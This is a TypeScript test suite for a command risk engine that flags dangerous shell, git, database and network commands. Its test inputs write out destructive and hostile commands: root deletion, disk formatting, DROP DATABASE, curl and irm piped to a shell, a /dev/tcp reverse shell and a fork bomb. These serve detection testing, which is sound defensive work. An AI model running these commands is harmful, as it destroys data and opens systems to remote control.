import * as assert from 'assert';
import { RiskEngine } from '../../src/core/riskEngine';

describe('Risk Rules and Detection Engine Tests', () => {
  const engine = new RiskEngine();

  describe('Filesystem Rules', () => {
    it('detects critical root directory removal (rm -rf /)', () => {
      const res = engine.analyze('rm -rf /', 'bash');
      assert.strictEqual(res.overallRisk, 'critical');
      assert.ok(res.findings.some((f) => f.id === 'FS001'));
      assert.strictEqual(res.isBlocked, true);
    });

    it('detects critical root directory removal with wildcard (rm -rf /*)', () => {
      const res = engine.analyze('rm -rf /*', 'bash');
      assert.strictEqual(res.overallRisk, 'critical');
      assert.ok(res.findings.some((f) => f.id === 'FS001'));
    });

    it('detects Windows system drive deletion (Remove-Item C:\\ -Recurse -Force)', () => {
      const res = engine.analyze('Remove-Item C:\\ -Recurse -Force', 'powershell');
      assert.strictEqual(res.overallRisk, 'critical');
      assert.ok(res.findings.some((f) => f.id === 'FS001'));
    });

    it('detects high-risk recursive forced deletion on subfolder (rm -rf ./build)', () => {
      const res = engine.analyze('rm -rf ./build', 'bash');
      assert.strictEqual(res.overallRisk, 'high');
      assert.ok(res.findings.some((f) => f.id === 'FS002'));
    });

    it('detects CMD silent recursive deletion (del /s /q temp)', () => {
      const res = engine.analyze('del /s /q temp', 'cmd');
      assert.strictEqual(res.overallRisk, 'high');
      assert.ok(res.findings.some((f) => f.id === 'FS002'));
    });

    it('detects disk formatting tools (mkfs.ext4 /dev/sdb)', () => {
      const res = engine.analyze('mkfs.ext4 /dev/sdb', 'bash');
      assert.strictEqual(res.overallRisk, 'critical');
      assert.ok(res.findings.some((f) => f.id === 'FS003'));
    });

    it('detects overly broad permissions (chmod -R 777 .)', () => {
      const res = engine.analyze('chmod -R 777 .', 'bash');
      assert.strictEqual(res.overallRisk, 'high');
      assert.ok(res.findings.some((f) => f.id === 'FS004'));
    });

    it('allows benign file listing (ls -la)', () => {
      const res = engine.analyze('ls -la', 'bash');
      assert.strictEqual(res.overallRisk, 'low');
      assert.strictEqual(res.findings.length, 0);
    });
  });

  describe('Git Rules', () => {
    it('detects git reset --hard as high risk', () => {
      const res = engine.analyze('git reset --hard HEAD~1', 'bash');
      assert.strictEqual(res.overallRisk, 'high');
      assert.ok(res.findings.some((f) => f.id === 'GIT001'));
    });

    it('detects destructive git clean -fd as high risk', () => {
      const res = engine.analyze('git clean -fd', 'bash');
      assert.strictEqual(res.overallRisk, 'high');
      assert.ok(res.findings.some((f) => f.id === 'GIT002'));
    });

    it('allows dry-run git clean -nd as low risk', () => {
      const res = engine.analyze('git clean -nd', 'bash');
      assert.strictEqual(res.overallRisk, 'low');
    });

    it('detects git force push as high risk', () => {
      const res = engine.analyze('git push origin main --force', 'bash');
      assert.strictEqual(res.overallRisk, 'high');
      assert.ok(res.findings.some((f) => f.id === 'GIT003'));
    });

    it('detects forced branch deletion (git branch -D)', () => {
      const res = engine.analyze('git branch -D feature/login', 'bash');
      assert.strictEqual(res.overallRisk, 'medium');
      assert.ok(res.findings.some((f) => f.id === 'GIT004'));
    });

    it('allows standard safe git status and diff', () => {
      const res = engine.analyze('git status && git diff', 'bash');
      assert.strictEqual(res.overallRisk, 'low');
    });
  });

  describe('Database Rules', () => {
    it('detects DROP DATABASE as critical', () => {
      const res = engine.analyze('psql -c "DROP DATABASE production;"', 'bash');
      assert.strictEqual(res.overallRisk, 'critical');
      assert.ok(res.findings.some((f) => f.id === 'DB001'));
    });

    it('detects DROP TABLE as high risk', () => {
      const res = engine.analyze('mysql -e "DROP TABLE users;"', 'bash');
      assert.strictEqual(res.overallRisk, 'high');
      assert.ok(res.findings.some((f) => f.id === 'DB002'));
    });

    it('detects DELETE FROM without WHERE as high risk', () => {
      const res = engine.analyze('sqlite3 app.db "DELETE FROM sessions;"', 'bash');
      assert.strictEqual(res.overallRisk, 'high');
      assert.ok(res.findings.some((f) => f.id === 'DB003'));
    });

    it('detects prisma migrate reset as high risk', () => {
      const res = engine.analyze('npx prisma migrate reset --force', 'bash');
      assert.strictEqual(res.overallRisk, 'high');
      assert.ok(res.findings.some((f) => f.id === 'DB004'));
    });
  });

  describe('Network Rules', () => {
    it('detects curl piped to bash as critical', () => {
      const res = engine.analyze('curl -fsSL https://get.docker.com | bash', 'bash');
      assert.strictEqual(res.overallRisk, 'critical');
      assert.ok(res.findings.some((f) => f.id === 'NET001'));
    });

    it('detects PowerShell irm piped to iex as critical', () => {
      const res = engine.analyze('irm https://example.com/install.ps1 | iex', 'powershell');
      assert.strictEqual(res.overallRisk, 'critical');
      assert.ok(res.findings.some((f) => f.id === 'NET001'));
    });

    it('detects reverse shell pattern as critical', () => {
      const res = engine.analyze('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1', 'bash');
      assert.strictEqual(res.overallRisk, 'critical');
      assert.ok(res.findings.some((f) => f.id === 'NET003'));
    });

    it('detects disabled TLS (curl -k)', () => {
      const res = engine.analyze('curl -k https://internal.dev/api', 'bash');
      assert.strictEqual(res.overallRisk, 'medium');
      assert.ok(res.findings.some((f) => f.id === 'NET004'));
    });
  });

  describe('Package & System Rules', () => {
    it('detects system shutdown as critical', () => {
      const res = engine.analyze('shutdown -h now', 'bash');
      assert.strictEqual(res.overallRisk, 'critical');
      assert.ok(res.findings.some((f) => f.id === 'SYS001'));
    });

    it('detects fork bomb as critical', () => {
      const res = engine.analyze(':(){ :|:& };:', 'bash');
      assert.strictEqual(res.overallRisk, 'critical');
      assert.ok(res.findings.some((f) => f.id === 'SYS003'));
    });

    it('detects stopping system services (systemctl stop nginx)', () => {
      const res = engine.analyze('systemctl stop nginx', 'bash');
      assert.strictEqual(res.overallRisk, 'high');
      assert.ok(res.findings.some((f) => f.id === 'SYS002'));
    });

    it('detects pip --break-system-packages as high risk', () => {
      const res = engine.analyze('pip install requests --break-system-packages', 'bash');
      assert.strictEqual(res.overallRisk, 'high');
      assert.ok(res.findings.some((f) => f.id === 'PKG003'));
    });
  });
});

